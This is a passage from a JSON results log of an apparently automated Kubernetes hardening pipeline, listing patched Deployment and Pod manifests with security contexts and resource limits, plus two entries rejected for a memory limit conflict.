path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00888",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00889",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00890",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00891",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "00892",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "00893",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "00894",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "00895",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "errors": []
  },
  {
    "id": "00896",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "errors": []
  },
  {
    "id": "00897",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "errors": []
  },
  {
    "id": "00898",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "errors": []
  },
  {
    "id": "00899",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"flog\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 100Mi"
    ]
  },
  {
    "id": "00900",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"flog\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 100Mi"
    ]
  },
  {
    "id": "00901",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00902",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      privileged: false\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00903",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00904",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00905",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00906",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00907",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
